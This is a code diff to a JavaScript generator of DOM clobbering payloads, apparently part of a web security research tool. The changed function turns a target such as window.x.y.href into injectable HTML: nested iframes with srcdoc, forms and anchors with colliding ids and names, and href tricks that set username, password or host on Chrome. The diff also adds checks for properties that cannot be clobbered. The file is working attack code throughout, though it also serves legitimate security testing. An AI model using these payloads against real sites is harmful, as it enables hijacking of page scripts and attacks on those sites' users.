@@ -38,13 +38,13 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
     const code_targets = statement.clobbering_target.split('.');
     var html = ["a","abbr","acronym","address","applet","area","article","aside","audio","b","base","basefont","bdi","bdo","bgsound","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","isindex","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp"]
     var props=[];
-
+    // document.a.s.c.v
     const chainIframes = function (clobbering_target, n) {
-        if (clobbering_target.length - 1 === n) {
-            return `<a id='${clobbering_target[n]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`;
+        if (clobbering_target.length - 2 === n) {
+            return `<a id='${clobbering_target[n+1]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`;
         }
 
-        let html = `<iframe name=${clobbering_target[n]} srcdoc="\n${"  ".repeat(n + 1) + chainIframes(clobbering_target, n + 1) + "\n" + "  ".repeat(n)}"></iframe>`;
+        let html = `<iframe name=${clobbering_target[n+1]} srcdoc="${chainIframes(clobbering_target, n + 1)}"></iframe>`;
 
         if (n === 1) html = html.replace(/"/g, '&quot;');
         else if (n > 1) html = html.replace(/"/g, '&quot;').replace(/&/g, "&amp;");
@@ -70,9 +70,18 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
             
             const payload = "Add something to clobber ";
             output.push(payload);
-        } else if (code_targets_length === 2) {
+        } 
+        
+        
+        else if (code_targets_length === 2) {
             // window.x 
-            if(clobbering_value === ""){                        // in this Just clobbering case -> any tag with id works for window clobbering could add more 
+            if(window.hasOwnProperty(code_targets[1])){
+                output = output.concat([
+                    `Cant clobber ${statement.clobbering_target}`
+                ]);
+            }
+            
+            else if(clobbering_value === ""){                        // in this Just clobbering case -> any tag with id works for window clobbering could add more 
                 output = output.concat([
                     `<anytag id="${code_targets[1]}"> works basically`
                 ]);
@@ -153,53 +162,93 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
             }
 
 
-        } else if (code_targets_length === 4 && code_targets[3] === 'src') {
+        } 
 
 
-            // CASE 1.3: window.x.y.src
-            output = output.concat([
-                `<video id="${code_targets[1]}"></video><video id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></video>`,
-                `<audio id="${code_targets[1]}"></audio><audio id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></audio>`,
-                `<embed id="${code_targets[1]}"></embed><embed id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></embed>`,
-                `<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
-                `<form id="${code_targets[1]}"><object id="${code_targets[2]}" data="${clobbering_value}" /> </form>`,
-            ]);
-        } else if (code_targets_length === 4 && code_targets[3] === 'value') {
-            // CASE 1.4: window.x.y.value
-            output = output.concat([
-                `<form id="${code_targets[1]}"><input type="text" id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
-                `<form id="${code_targets[1]}"><output id="${code_targets[2]}">${clobbering_value}</output></form>`,
-                `<form id="${code_targets[1]}"><textarea id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
-                `<form id="${code_targets[1]}"><object id="${code_targets[2]}" value="${clobbering_value}" data="${clobbering_value}" /></form>`,
-            ]);
-        } else if (code_targets_length === 4 && code_targets[3] === 'href') {
-            // CASE 1.5: window.x.y.href
-            output = output.concat([
-                `<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
-                `<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n  <input name="${code_targets[3]}">\n</form>`,
-                chainIframes(code_targets, 0),
-            ]);
-        } else if (code_targets_length === 4) {
+        else if(code_targets_length === 4){
 
 
-            // CASE 1.6: window.x.y.z we need </form> for the form payload to become a HTML Collection!!
-            output = output.concat([
-                `<form id="${code_targets[1]}">\n</form><form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
-                chainIframes(code_targets, 0),
-            ]);
+                    if ( code_targets[3] === 'src') {
 
 
-        } else if (code_targets_length === 5) {
-            // CASE 1.7: window.x.y.z.w
-            let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
-            let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
-            output = output.concat([payload]);
-        } else if (code_targets_length === 6 && code_targets[5] === 'href') {
-            // CASE 1.8: window.x.y.z.w.href
-            let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
-            let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
-            output = output.concat([payload]);
-        } else {
+                        //  window.x.y.src
+                        output = output.concat([
+                            `<video id="${code_targets[1]}"></video><video id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></video>`,
+                            `<audio id="${code_targets[1]}"></audio><audio id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></audio>`,
+                            `<embed id="${code_targets[1]}"></embed><embed id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></embed>`,
+                            `<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
+                            `<form id="${code_targets[1]}"><object id="${code_targets[2]}" data="${clobbering_value}" /> </form>`,
+                        ]);
+                    } else if (code_targets[3] === 'value') {
+                        //  window.x.y.value
+                        output = output.concat([
+                            `<form id="${code_targets[1]}"><input type="text" id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
+                            `<form id="${code_targets[1]}"><output id="${code_targets[2]}">${clobbering_value}</output></form>`,
+                            `<form id="${code_targets[1]}"><textarea id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
+                            `<form id="${code_targets[1]}"><object id="${code_targets[2]}" value="${clobbering_value}" data="${clobbering_value}" /></form>`,
+                        ]);
+                    } else if (code_targets[3] === 'href') {
+                        //  window.x.y.href
+                        output = output.concat([
+                            `<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
+                            `<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n  <input name="${code_targets[3]}">\n</form>`,
+                            chainIframes(code_targets, 0),
+                        ]);
+                    
+                    } else if (code_targets[3] === 'username') {
+                        //  window.x.y.username works only on chrome 
+                        output = output.concat([
+                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}:x@x.com"></a>`,
+                        
+                        ]);
+                    
+                    }else if (code_targets[3] === 'password') {
+                        //  window.x.y.password works only on chrome 
+                        output = output.concat([
+                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="random:${clobbering_value}@x.com"></a>`,
+                        
+                        ]);
+                    
+                    }else if (code_targets[3] === 'host') {
+                        //  window.x.y.host works only on chrome 
+                        output = output.concat([
+                            `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="x:x@${clobbering_value}"></a>`,
+                        
+                        ]);
+                    
+                    } else if (code_targets_length === 4) {
+            
+            
+                        // CASE 1.6: window.x.y.z we need </form> for the form payload to become a HTML Collection!!
+                        output = output.concat([
+                            `Chrome : <form id="${code_targets[1]}">\n</form><form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
+                            `<base href="x:"><iframe name=${code_targets[1]} srcdoc="<iframe name=${code_targets[2]} srcdoc='<a id=${code_targets[3]} href=${clobbering_value}>'></iframe>"></iframe>`,
+                        ]);
+            
+            
+                    } 
+        }
+        
+        
+        else if (code_targets_length === 5) {
+                    // CASE 1.7: window.x.y.z.w
+                    let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
+                    let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
+                    output = output.concat([payload]);
+        }
+        
+        
+        else if (code_targets_length === 6 && code_targets[5] === 'href') {
+                    // CASE 1.8: window.x.y.z.w.href
+                    let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
+                    let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
+                    output = output.concat([payload]);
+        } 
+        
+        
+        
+        
+        else {
             // CASE 1.9: for higher levels, recursively chain iframes to create nested frames of length n
             let payload = chainIframes(code_targets, 0);
             output = output.concat([payload]);
@@ -214,14 +263,20 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
             // cannot clobber document object alone;
             const payload = "Warning: the global `document` object cannot be clobbered!";
             output = output.concat([payload]);
-        } else if (code_targets_length === 2) {
+        } 
+        else if(document.hasOwnProperty(code_targets[1])){
+            const payload = `Warning: ${statement.clobbering_target} cannot be clobbered!`;
+            output = output.concat([payload]);
+        }
+
+        else if (code_targets_length === 2) {
             // CASE 2.1: document.x
             output = output.concat([
                 `<embed name="${code_targets[1]}" src="${clobbering_value}"></embed>`,
                 `<img name="${code_targets[1]}" src="${clobbering_value}"></img>`,
                 `<object id="${code_targets[1]}" data="${clobbering_value}"></object>`,
                 `<form name="${code_targets[1]}"></form>`,
-                `<iframe name="${code_targets[1]}"></iframe>`,
+                `Chrome : <iframe name="${code_targets[1]}"></iframe>`,
             ]);
         } else if (code_targets_length === 3) {
             // CASE 2.2: document.x.y
@@ -247,9 +302,6 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
     return output;
 };
 
-/*
- *	glue code for payload generation
- */
 
 function get_bootstrap_color_class(i) {
     /* pick a random color */
